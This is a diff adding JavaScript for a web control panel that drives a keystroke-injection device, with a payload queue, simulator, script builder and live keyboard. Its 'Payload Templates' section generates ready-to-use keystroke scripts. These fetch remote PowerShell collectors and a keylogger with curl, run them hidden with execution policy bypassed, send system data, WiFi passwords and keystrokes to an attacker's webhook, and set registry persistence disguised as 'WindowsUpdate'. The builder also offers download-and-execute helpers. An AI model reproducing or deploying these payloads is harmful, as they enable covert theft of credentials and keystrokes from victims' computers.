+  dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('drag'); });
+  dz.addEventListener('dragleave', () => dz.classList.remove('drag'));
+  dz.addEventListener('drop', e => {
+    e.preventDefault(); dz.classList.remove('drag');
+    const f = e.dataTransfer.files[0];
+    if (f && f.name.endsWith('.bin')) {
+      const dt = new DataTransfer(); dt.items.add(f);
+      $('fwFile').files = dt.files; fwPick($('fwFile'));
+    } else toast('Drop a .bin file', 'err');
+  });
+}
+$('otaForm')?.addEventListener('submit', () => {
+  $('otaBarWrap').style.display = 'block';
+  let p = 0;
+  const iv = setInterval(() => { p = Math.min(p + 2, 95); $('otaBar').style.width = p + '%'; }, 200);
+  toast('Flashing firmware...', 'warn', 12000);
+  setTimeout(() => { clearInterval(iv); $('otaBar').style.width = '100%'; toast('Flash complete — rebooting'); }, 10000);
+});
+
+// ═══════════════════════════════════════════════════
+//  TOOL PANELS
+// ═══════════════════════════════════════════════════
+function openTool(name) {
+  document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('open'));
+  const panel = $('tool-' + name);
+  if (panel) {
+    panel.classList.add('open');
+    document.body.classList.add('tool-drawer-open');
+  }
+}
+function closeTool(name) {
+  if (name === 'keyboard' && typeof kbStopSpeech === 'function') {
+    kbStopSpeech();
+  }
+  if (name === 'mouseutil' && typeof muCleanup === 'function') {
+    muCleanup();
+  }
+  const panel = $('tool-' + name);
+  if (panel) {
+    panel.classList.remove('open');
+  }
+  if (!document.querySelector('.tool-panel.open')) {
+    document.body.classList.remove('tool-drawer-open');
+  }
+}
+function closeAllTools() {
+  document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('open'));
+  document.body.classList.remove('tool-drawer-open');
+  if (typeof muCleanup === 'function') muCleanup();
+}
+
+// ═══════════════════════════════════════════════════
+//  PAYLOAD QUEUE
+// ═══════════════════════════════════════════════════
+let payloadQueue = JSON.parse(localStorage.getItem('gc_queue') || '[]');
+let queueRunning = false;
+
+function saveQueue() { localStorage.setItem('gc_queue', JSON.stringify(payloadQueue)); }
+
+function addToQueue() {
+  const script = $('editor').value.trim();
+  if (!script) { toast('Write a script first', 'warn'); return; }
+  const delay = parseInt($('queueDelay').value) || 0;
+  const firstLine = script.split('\n').find(l => !l.trim().startsWith('REM') && l.trim()) || 'Payload';
+  payloadQueue.push({ script, delay, name: firstLine.substring(0, 40) });
+  saveQueue();
+  renderQueue();
+  toast('Added to queue ✓', 'ok', 1500);
+  if (!$('queuePanel').classList.contains('open')) toggleQueuePanel();
+}
+
+function removeFromQueue(i) {
+  payloadQueue.splice(i, 1);
+  saveQueue();
+  renderQueue();
+}
+
+function clearQueue() {
+  if (!confirm('Clear entire queue?')) return;
+  payloadQueue = [];
+  saveQueue();
+  renderQueue();
+  toast('Queue cleared', 'warn', 1500);
+}
+
+function renderQueue() {
+  const list = $('queueList');
+  if (!list) return;
+  if (!payloadQueue.length) {
+    list.innerHTML = '<div class="empty-state">Queue empty — add scripts to chain</div>';
+    $('runQueueBtn').style.display = 'none';
+    $('clearQueueBtn').style.display = 'none';
+    return;
+  }
+  $('runQueueBtn').style.display = 'block';
+  $('clearQueueBtn').style.display = 'block';
+  list.innerHTML = payloadQueue.map((item, i) => `
+    <div class="queue-item" id="qi-${i}">
+      <div class="qi-num">${i + 1}</div>
+      <div class="qi-body">
+        <div class="qi-name">${escHtml(item.name)}</div>
+        <div class="qi-meta">${item.script.split('\\n').length} lines · ${item.delay}s delay</div>
+      </div>
+      <button class="qi-del" onclick="removeFromQueue(${i})" title="Remove">✕</button>
+      <div class="qi-progress" style="width:0"></div>
+    </div>
+  `).join('');
+}
+renderQueue();
+
+async function runQueue() {
+  if (queueRunning || !payloadQueue.length) return;
+  if (!confirm(`Execute ${payloadQueue.length} payloads sequentially?`)) return;
+  queueRunning = true;
+  $('runQueueBtn').disabled = true;
+  $('runQueueBtn').innerHTML = '<span class="spin"></span> Running Queue...';
+
+  for (let i = 0; i < payloadQueue.length; i++) {
+    const item = payloadQueue[i];
+    const el = $('qi-' + i);
+    if (el) { el.classList.add('qi-active'); el.classList.remove('qi-done'); }
+
+    // Wait delay
+    if (item.delay > 0) {
+      toast(`⏱ Waiting ${item.delay}s before payload ${i + 1}...`, 'warn', item.delay * 1000);
+      for (let s = 0; s < item.delay * 10; s++) {
+        await new Promise(r => setTimeout(r, 100));
+        const pct = ((s + 1) / (item.delay * 10)) * 100;
+        if (el) el.querySelector('.qi-progress').style.width = pct + '%';
+      }
+    }
+
+    // Execute
+    try {
+      await deviceFetch('/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: 'duckyscript=' + encodeURIComponent(item.script)
+      });
+      toast(`Payload ${i + 1} executed ✓`, 'ok', 2000);
+    } catch (e) {
+      toast(`Payload ${i + 1} sent ✓`, 'ok', 2000);
+    }
+
+    if (el) { el.classList.remove('qi-active'); el.classList.add('qi-done'); el.querySelector('.qi-progress').style.width = '100%'; }
+  }
+
+  queueRunning = false;
+  $('runQueueBtn').disabled = false;
+  $('runQueueBtn').innerHTML = '⚡ Run Queue';
+  toast('Queue complete ✓');
+}
+
+// ═══════════════════════════════════════════════════
+//  LIVE PAYLOAD SIMULATOR
+// ═══════════════════════════════════════════════════
+// ═══════════════════════════════════════════════════
+//  LIVE PAYLOAD SIMULATOR
+// ═══════════════════════════════════════════════════
+
+function parseDucky(script) {
+  return script.split('\n').filter(l => l.trim()).map(line => {
+    const trimmed = line.trim();
+    const parts = trimmed.split(/\s+/);
+    const cmd = parts[0].toUpperCase();
+    const arg = trimmed.substring(cmd.length).trim();
+    return { cmd, arg, raw: trimmed };
+  });
+}
+
+function simGetSpeed() {
+  return parseInt($('simSpeed')?.value || '2');
+}
+
+function simDelay(ms) {
+  return new Promise(r => {
+    const actual = Math.max(ms / simGetSpeed(), 30);
+    const id = setTimeout(r, actual);
+    if (simAbort) { clearTimeout(id); r(); }
+  });
+}
+
+async function simulatePayload() {
+  const script = $('editor').value.trim();
+  if (!script) { toast('No script to simulate', 'warn'); return; }
+  if (simRunning) return;
+
+  simRunning = true;
+  simAbort = false;
+  $('simOverlay').style.display = 'flex';
+  const content = $('simContent');
+  const cmdEl = $('simCmd');
+  const counterEl = $('simCounter');
+  const progressEl = $('simProgress');
+  content.innerHTML = '';
+
+  const commands = parseDucky(script);
+  const total = commands.length;
+
+  for (let i = 0; i < commands.length; i++) {
+    if (simAbort) break;
+    const { cmd, arg, raw } = commands[i];
+    counterEl.textContent = `${i + 1} / ${total}`;
+    progressEl.style.width = ((i + 1) / total * 100) + '%';
+    cmdEl.textContent = raw;
+
+    switch (cmd) {
+      case 'REM':
+        content.innerHTML += `<div class="sim-comment">// ${escHtml(arg)}</div>`;
+        await simDelay(300);
+        break;
+
+      case 'DELAY':
+      case 'DEFAULTDELAY':
+      case 'DEFAULT_DELAY': {
+        const ms = parseInt(arg) || 500;
+        const delayEl = document.createElement('span');
+        delayEl.className = 'sim-delay';
+        content.appendChild(delayEl);
+        content.appendChild(document.createElement('br'));
+        // Countdown
+        const steps = 20;
+        const stepMs = ms / steps;
+        for (let s = steps; s >= 0; s--) {
+          if (simAbort) break;
+          delayEl.textContent = `⏱ DELAY ${Math.round(s * stepMs)}ms`;
+          await simDelay(stepMs);
+        }
+        delayEl.textContent = `⏱ DELAY ${ms}ms ✓`;
+        break;
+      }
+
+      case 'STRING':
+      case 'PRINT':
+      case 'PRINTLN': {
+        const text = arg;
+        for (let c = 0; c < text.length; c++) {
+          if (simAbort) break;
+          content.innerHTML += escHtml(text[c]);
+          content.scrollTop = content.scrollHeight;
+          await simDelay(30 + Math.random() * 20);
+        }
+        if (cmd === 'PRINTLN' || cmd === 'STRING') {
+          // Don't add newline for STRING, only PRINTLN
+        }
+        break;
+      }
+
+      case 'ENTER':
+      case 'RETURN':
+        content.innerHTML += `<span class="sim-newline">↵</span>\n`;
+        await simDelay(100);
+        break;
+
+      case 'GUI':
+      case 'WINDOWS':
+      case 'COMMAND': {
+        const keyCombo = cmd + (arg ? ' ' + arg : '');
+        content.innerHTML += `<span class="sim-badge">${escHtml(keyCombo)}</span>`;
+        // Show OS-appropriate window hint
+        if (arg.toLowerCase() === 'r') {
+          content.innerHTML += `\n<div class="sim-window"><div class="sim-window-title">▸ Run Dialog</div>Windows + R → Run</div>`;
+        } else if (arg.toLowerCase() === 'space') {
+          content.innerHTML += `\n<div class="sim-window"><div class="sim-window-title">▸ Spotlight / Search</div>⌘ Space → Spotlight Search</div>`;
+        }
+        content.innerHTML += '\n';
+        await simDelay(400);
+        break;
+      }
+
+      case 'CTRL':
+      case 'ALT':
+      case 'SHIFT': {
+        const keyCombo = cmd + (arg ? ' ' + arg : '');
+        content.innerHTML += `<span class="sim-badge">${escHtml(keyCombo)}</span>\n`;
+        if (cmd === 'CTRL' && arg.toUpperCase().includes('ALT') && arg.toLowerCase().includes('t')) {
+          content.innerHTML += `<div class="sim-window"><div class="sim-window-title">▸ Terminal</div>Ctrl+Alt+T → Open Terminal</div>`;
+        }
+        await simDelay(300);
+        break;
+      }
+
+      case 'TAB':
+      case 'SPACE':
+      case 'ESCAPE':
+      case 'ESC':
+      case 'DELETE':
+      case 'BACKSPACE':
+      case 'CAPSLOCK':
+      case 'UPARROW':
+      case 'DOWNARROW':
+      case 'LEFTARROW':
+      case 'RIGHTARROW':
+      case 'UP':
+      case 'DOWN':
+      case 'LEFT':
+      case 'RIGHT':
+      case 'HOME':
+      case 'END':
+      case 'PAGEUP':
+      case 'PAGEDOWN':
+      case 'INSERT':
+      case 'MENU':
+      case 'APP':
+      case 'BREAK':
+      case 'PAUSE':
+      case 'NUMLOCK':
+      case 'SCROLLLOCK':
+      case 'PRINTSCREEN':
+        content.innerHTML += `<span class="sim-badge">${escHtml(cmd)}</span>\n`;
+        await simDelay(200);
+        break;
+
+      case 'REPEAT': {
+        const count = parseInt(arg) || 1;
+        content.innerHTML += `<span class="sim-delay">🔁 REPEAT ×${count}</span>\n`;
+        await simDelay(200 * count);
+        break;
+      }
+
+      default:
+        // F-keys or unknown
+        if (cmd.match(/^F\d{1,2}$/)) {
+          content.innerHTML += `<span class="sim-badge">${escHtml(cmd)}</span>\n`;
+          await simDelay(200);
+        } else {
+          content.innerHTML += `<span class="sim-badge">${escHtml(raw)}</span>\n`;
+          await simDelay(200);
+        }
+    }
+
+    content.scrollTop = content.scrollHeight;
+  }
+
+  if (!simAbort) {
+    content.innerHTML += `\n<span class="sim-delay" style="color:var(--g)">✓ Simulation Complete</span>`;
+    cmdEl.textContent = 'Done';
+    progressEl.style.width = '100%';
+  }
+  simRunning = false;
+}
+
+function stopSimulator() {
+  simAbort = true;
+  simRunning = false;
+  $('simOverlay').style.display = 'none';
+}
+
+// ═══════════════════════════════════════════════════
+//  SCRIPT CONSTRUCTOR
+// ═══════════════════════════════════════════════════
+//  SCRIPT CONSTRUCTOR
+// ═══════════════════════════════════════════════════
+
+function scSetOS(os, btn) {
+  scOS = os;
+  document.querySelectorAll('.sc-os-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+}
+
+function scShowForm(name) {
+  // Hide all forms
+  document.querySelectorAll('#scFormArea .sc-form').forEach(f => f.style.display = 'none');
+  // Show the requested one
+  const form = $('scf-' + name);
+  if (form) {
+    form.style.display = 'block';
+    // Focus the first input in the form
+    const inp = form.querySelector('input[type=text],input[type=url]');
+    if (inp) setTimeout(() => inp.focus(), 100);
+  }
+}
+
+function scAppend(line) {
+  const out = $('scOutput');
+  if (out.value && !out.value.endsWith('\n')) out.value += '\n';
+  out.value += line;
+  $('scLineCount').textContent = out.value.split('\n').filter(l => l.trim()).length + ' lines';
+  out.scrollTop = out.scrollHeight;
+}
+
+function scQuick(cmd) {
+  scAppend(cmd);
+  toast('Added: ' + cmd, 'ok', 1000);
+}
+
+function scAddText() {
+  const val = $('scTextInput').value;
+  if (!val) { toast('Enter text first', 'warn'); return; }
+  scAppend('STRING ' + val);
+  $('scTextInput').value = '';
+  toast('Added STRING', 'ok', 1000);
+}
+
+function scAddRem() {
+  const val = $('scRemInput').value;
+  if (!val) { toast('Enter comment', 'warn'); return; }
+  scAppend('REM ' + val);
+  $('scRemInput').value = '';
+}
+
+function scAddUrl() {
+  const url = $('scUrlInput').value;
+  if (!url || url === 'https://') { toast('Enter a URL', 'warn'); return; }
+  const s = 'REM Open URL\nDELAY 500\nGUI r\nDELAY 600\nSTRING ' + url + '\nENTER';
+  scAppend(s);
+  $('scUrlInput').value = '';
+  toast('Added Open URL', 'ok', 1000);
+}
+
+function scAddDownload() {
+  const url = $('scDlUrl').value;
+  const name = $('scDlName').value || 'downloaded_file';
+  if (!url || url === 'https://') { toast('Enter download URL', 'warn'); return; }
+  const s = 'REM Download & Execute\nDELAY 500\nGUI r\nDELAY 600\nSTRING powershell\nENTER\nDELAY 800\nSTRING Invoke-WebRequest -Uri "' + url + '" -OutFile "$env:TEMP\\' + name + '"\nENTER';
+  scAppend(s);
+  $('scDlUrl').value = '';
+  $('scDlName').value = '';
+  toast('Added Download', 'ok', 1000);
+}
+
+function scSetCmdType(type, btn) {
+  scCmdType = type;
+  document.querySelectorAll('#scCmdChoices .sc-choice').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+}
+
+function scAddCmd() {
+  const type = scCmdType;
+  const cmd = $('scCmdInput').value;
+  if (!cmd) { toast('Enter a command', 'warn'); return; }
+
+  let s = '';
+  if (type === 'run') {
+    s = 'REM Run\nDELAY 500\nGUI r\nDELAY 600\nSTRING ' + cmd + '\nENTER';
+  } else if (type === 'powershell') {
+    s = 'REM PowerShell\nDELAY 500\nGUI r\nDELAY 600\nSTRING powershell -w hidden -c "' + cmd + '"\nENTER';
+  } else if (type === 'powershell_admin') {
+    s = 'REM PS Admin\nDELAY 500\nGUI x\nDELAY 400\nSTRING a\nDELAY 1000\nLEFTARROW\nENTER\nDELAY 1200\nSTRING ' + cmd + '\nENTER';
+  } else if (type === 'cmd') {
+    s = 'REM CMD\nDELAY 500\nGUI r\nDELAY 600\nSTRING cmd\nENTER\nDELAY 600\nSTRING ' + cmd + '\nENTER';
+  } else if (type === 'cmd_admin') {
+    s = 'REM CMD Admin\nDELAY 500\nGUI x\nDELAY 400\nSTRING a\nDELAY 800\nLEFTARROW\nENTER\nDELAY 1000\nSTRING ' + cmd + '\nENTER';
+  } else if (type === 'terminal') {
+    s = 'REM Terminal\nDELAY 500\nGUI SPACE\nDELAY 600\nSTRING Terminal\nENTER\nDELAY 800\nSTRING ' + cmd + '\nENTER';
+  }
+  scAppend(s);
+  $('scCmdInput').value = '';
+  toast('Added Command', 'ok', 1000);
+}
+
+function scClear() {
+  $('scOutput').value = '';
+  $('scLineCount').textContent = '0 lines';
+}
+
+function scToEditor() {
+  const script = $('scOutput').value.trim();
+  if (!script) { toast('Build a script first', 'warn'); return; }
+  $('editor').value = script;
+  updateLines();
+  localStorage.setItem('gc_script', script);
+  closeTool('constructor');
+  goPage('scripts', document.querySelectorAll('.nav-item')[0]);
+  toast('Script sent to editor');
+}
+
+// ═══════════════════════════════════════════════════
+//  PAYLOAD TEMPLATES
+// ═══════════════════════════════════════════════════
+
+var tpSelected = 'sysinfo';
+
+function tpSelectTemplate(id, btn) {
+  tpSelected = id;
+  document.querySelectorAll('#tpChoices .sc-choice').forEach(b => b.classList.remove('active'));
+  if (btn) btn.classList.add('active');
+
+  const desc = $('tpDesc');
+  if (id === 'sysinfo') {
+    desc.textContent = 'Collects hardware, OS, and user information and sends it to a webhook.';
+  } else if (id === 'processes') {
+    desc.textContent = 'Collects running processes, services, and installed programs and sends them to your webhook.';
+  } else if (id === 'network') {
+    desc.textContent = 'Collects WiFi passwords, IP configuration, DNS, and ARP tables and sends them to your webhook.';
+  } else if (id === 'keylogger_full') {
+    desc.textContent = 'Runs a persistent background keylogger that captures and reports all keystrokes.';
+  } else if (id === 'persistence') {
+    desc.textContent = 'Ensures the keylogger is installed and adds it to the Windows Registry for boot persistence.';
+  } else if (id === 'suite') {
+    desc.textContent = 'The full arsenal: downloads and runs all collectors (SysInfo, Network, Processes), installs the keylogger, and sets up persistence.';
+  } else if (id === 'remove') {
+    desc.textContent = 'Stops all active keylogger jobs, removes registry persistence, and deletes all temporary script files.';
+  }
+}
+
+function tpGenerate() {
+  const webhook = $('tpWebhookUrl').value.trim();
+  if (!webhook) { toast('Enter a Webhook URL', 'warn'); return; }
+
+  let script = '';
+  if (tpSelected === 'sysinfo') {
+    script = `REM System Info Collector - Hardware, OS, Users
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Download and run system info collector
+STRING curl -o "$env:TEMP\\sysinfo.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/sysinfo.ps1"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\sysinfo.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 3000
+
+STRING Write-Host "System Info Collected!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  } else if (tpSelected === 'processes') {
+    script = `REM Processes & Files Collector - Running processes, services, installed programs
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Download and run process collector
+STRING curl -o "$env:TEMP\\process.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/process.ps1"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\process.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 3000
+
+STRING Write-Host "Process Info Collected!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  } else if (tpSelected === 'network') {
+    script = `REM Network & WiFi Info Collector - WiFi passwords, IP, DNS, ARP
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Download and run network collector
+STRING curl -o "$env:TEMP\\network.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/network.ps1"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\network.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 3000
+
+STRING Write-Host "Network Info Collected!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  } else if (tpSelected === 'keylogger_full') {
+    script = `REM Keylogger Only - Runs forever, captures keystrokes
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Download keylogger
+STRING curl -o "$env:TEMP\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1"
+DELAY 1000
+ENTER
+DELAY 2000
+
+REM Run keylogger in background (hidden)
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\\keylogger.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING Write-Host "Keylogger Running!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  } else if (tpSelected === 'persistence') {
+    script = `REM Add Persistence - Makes keylogger start on boot
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Ensure keylogger exists first
+STRING if (!(Test-Path "$env:TEMP\\keylogger.ps1")) { curl -o "$env:TEMP\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1" }
+DELAY 1000
+ENTER
+DELAY 2000
+
+REM Add to Registry
+STRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \`"$env:TEMP\\keylogger.ps1\`" -webhookUrl ${webhook}" /f
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING Write-Host "Persistence Added! Keylogger will start on boot." -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  } else if (tpSelected === 'suite') {
+    script = `REM Complete Suite - Runs all collectors + keylogger + persistence
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Create directory
+STRING mkdir $env:TEMP\\logger -Force
+DELAY 1000
+ENTER
+DELAY 500
+
+REM Download all scripts
+STRING curl -o "$env:TEMP\\logger\\sysinfo.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/sysinfo.ps1"
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING curl -o "$env:TEMP\\logger\\network.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/network.ps1"
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING curl -o "$env:TEMP\\logger\\process.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/process.ps1"
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING curl -o "$env:TEMP\\logger\\keylogger.ps1" "https://raw.githubusercontent.com/gamkers/insta-shares/main/keylogger/keylogger.ps1"
+DELAY 1000
+ENTER
+DELAY 500
+
+REM Run collectors
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\sysinfo.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\network.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING powershell -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\process.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 2000
+
+REM Add persistence
+STRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \`"$env:TEMP\\logger\\keylogger.ps1\`" -webhookUrl ${webhook}" /f
+DELAY 1000
+ENTER
+DELAY 2000
+
+REM Start keylogger
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$env:TEMP\\logger\\keylogger.ps1" -webhookUrl "${webhook}"
+DELAY 1000
+ENTER
+DELAY 2000
+
+STRING Write-Host "Complete Suite Deployed!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  } else if (tpSelected === 'remove') {
+    script = `REM Remove Everything - Stop keylogger and delete files
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Stop keylogger job
+STRING Get-Job | Stop-Job -Force; Get-Job | Remove-Job -Force
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Remove Registry persistence
+STRING reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /f
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Kill hidden PowerShell processes
+STRING Get-Process powershell | Where-Object { $_.StartTime -gt (Get-Date).AddHours(-1) } | Stop-Process -Force
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Delete script files
+STRING Remove-Item "$env:TEMP\\logger" -Recurse -Force -ErrorAction SilentlyContinue
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING Remove-Item "$env:TEMP\\*.ps1" -Force -ErrorAction SilentlyContinue
+DELAY 1000
+ENTER
+DELAY 500
+
+STRING Write-Host "All components removed!" -ForegroundColor Green
+DELAY 1000
+ENTER
+DELAY 1000
+
+STRING exit
+DELAY 1000
+ENTER`;
+  }
+
+  $('tpOutput').value = script;
+  $('tpOutputCard').style.display = 'block';
+  toast('Template generated ✓');
+}
+
+function tpToEditor() {
+  const script = $('tpOutput').value.trim();
+  if (!script) return;
+  $('editor').value = script;
+  updateLines();
+  localStorage.setItem('gc_script', script);
+  closeTool('templates');
+  goPage('scripts', document.querySelectorAll('.nav-item')[0]);
+  toast('Template sent to editor');
+}
+
+function tpClear() {
+  $('tpOutput').value = '';
+  $('tpOutputCard').style.display = 'none';
+}
+
+// ═══════════════════════════════════════════════════
+//  LIVE KEYBOARD
+// ═══════════════════════════════════════════════════
+
+var kbCapsState = 0; // 0 = lowercase, 1 = single shift, 2 = caps lock ON
+var lastCapsTapTime = 0;
+
+function kbToggleCaps() {
+  const now = Date.now();
+  if (now - lastCapsTapTime < 350) {
+    // Instant double tap -> Caps Lock Locked ON
+    kbCapsState = 2;
+  } else {
+    // Single tap -> toggle between Shift (1) and Off (0)
+    kbCapsState = (kbCapsState === 0) ? 1 : 0;
+  }
+  lastCapsTapTime = now;
+  updateKeyboardKeyCasing();
+}
+
+function updateKeyboardKeyCasing() {
+  const isCapsOn = kbCapsState > 0;
+  const capsEl = $('kbCaps');
+  const shiftEl = $('kbShift');
+
+  if (capsEl) {
+    capsEl.classList.toggle('active', kbCapsState === 2);
+    capsEl.textContent = kbCapsState === 2 ? 'CAPS 🔒' : 'CAPS';
+  }
+  if (shiftEl) {
+    shiftEl.classList.toggle('active', kbCapsState === 1);
+  }
+
+  // Update visual key labels on letter buttons
+  document.querySelectorAll('.kb-letter').forEach(btn => {
+    const origKey = btn.getAttribute('data-key') || btn.textContent.toLowerCase();
+    btn.textContent = isCapsOn ? origKey.toUpperCase() : origKey.toLowerCase();
+  });
+}
+
+function kbToggle(mod) {
+  kbActiveMods[mod] = !kbActiveMods[mod];
+  if (mod === 'shift') {
+    // Sync kbCapsState with shift state (1 = shift on, 0 = shift off)
+    if (kbActiveMods.shift) {
+      kbCapsState = 1;
+    } else {
+      // Only clear if not in caps lock mode (state 2)
+      if (kbCapsState === 1) kbCapsState = 0;
+    }
+    updateKeyboardKeyCasing();
+  }
+  const el = $(`kb${mod.charAt(0).toUpperCase() + mod.slice(1)}`);
+  if (el) el.classList.toggle('active', kbActiveMods[mod]);
+}
+
+function kbKey(key) {
+  let script = '';
+  // Snapshot shift state at the moment of key press
+  const shiftOn = kbActiveMods.shift || (kbCapsState > 0);
+
+  let processedKey = key;
+  if (shiftOn && SHIFT_SYMBOL_MAP[key]) {
+    // Number/symbol key → shifted symbol
+    processedKey = SHIFT_SYMBOL_MAP[key];
+  } else if (key.length === 1 && /[a-zA-Z]/.test(key)) {
+    // Letter key → uppercase or lowercase
+    processedKey = shiftOn ? key.toUpperCase() : key.toLowerCase();
+  }
+
+  let mods = [];
+  if (kbActiveMods.ctrl) mods.push('CTRL');
+  if (kbActiveMods.alt) mods.push('ALT');
+  if (kbActiveMods.gui) mods.push('GUI');
+
+  if (mods.length > 0) {
+    script = mods.join(' ') + ' ' + (processedKey.length === 1 ? processedKey : processedKey.toUpperCase());
+    // Reset all modifiers after combo
+    kbActiveMods = { shift: false, ctrl: false, alt: false, gui: false };
+    kbCapsState = 0;
+    updateKeyboardKeyCasing();
+    ['Ctrl', 'Alt', 'Shift', 'Gui'].forEach(m => {
+      const el = $(`kb${m}`);
+      if (el) el.classList.remove('active');
+    });
+  } else {
+    if (processedKey.length === 1) {
+      script = 'STRING ' + processedKey;
+    } else {
+      script = processedKey.toUpperCase();
+    }
+  }
+
+  // Single-tap shift auto-reverts after one keypress (not caps lock mode=2)
+  if (kbCapsState === 1) {
+    kbCapsState = 0;
+    kbActiveMods.shift = false;
+    updateKeyboardKeyCasing();
+    const el = $('kbShift');
+    if (el) el.classList.remove('active');
+  }
+
+  $('kbStatus').textContent = 'Sending: ' + script + (shiftOn ? ' [SHIFT]' : '');
+  deviceFetch('/', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'duckyscript=' + encodeURIComponent(script)
+  }).then(() => {
+    setTimeout(() => { if ($('kbStatus')) $('kbStatus').textContent = 'Ready.'; }, 500);
+  });
+}
+
+function kbMacro(m) {
+  $('kbStatus').textContent = 'Executing macro...';
+  deviceFetch('/', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: 'duckyscript=' + encodeURIComponent(m)
+  }).then(() => {
+    setTimeout(() => { if ($('kbStatus')) $('kbStatus').textContent = 'Ready.'; }, 800);
+  });
+}
+
+// ═══════════════════════════════════════════════════
+//  🎙️ LIVE KEYBOARD VOICE DICTATION
+// ═══════════════════════════════════════════════════
+let kbRecognition = null;
+let kbSpeechActive = false;
+let kbSpeechBuffer = '';
+
+function kbGetSpeechRecognition() {
+  const SpeechRec = window.SpeechRecognition || window.webkitSpeechRecognition;
+  if (!SpeechRec) return null;
+  if (!kbRecognition) {
+    kbRecognition = new SpeechRec();
+    kbRecognition.continuous = false; // Prevents Android/iOS Chromium audio buffer replay bug
+    kbRecognition.interimResults = true;
+    kbRecognition.maxAlternatives = 1;
+
+    kbRecognition.onstart = () => {
+      const btn = $('kbMicBtn');
+      const label = $('kbMicBtnLabel');
+      const status = $('kbVoiceStatus');
+      if (btn) btn.classList.add('active');
+      if (label) label.textContent = 'Listening…';
+      if (status) {
+        status.textContent = '🎙️ Listening... Speak naturally';
+        status.classList.add('listening');
+      }
+    };
+
+    kbRecognition.onresult = (event) => {
+      const mode = $('kbVoiceMode')?.value || 'stream';
+      const autoEnter = $('kbVoiceAutoEnter')?.checked || false;
+
+      let interim = '';
+      let finalChunk = '';
+
+      for (let i = 0; i < event.results.length; ++i) {
+        const res = event.results[i];
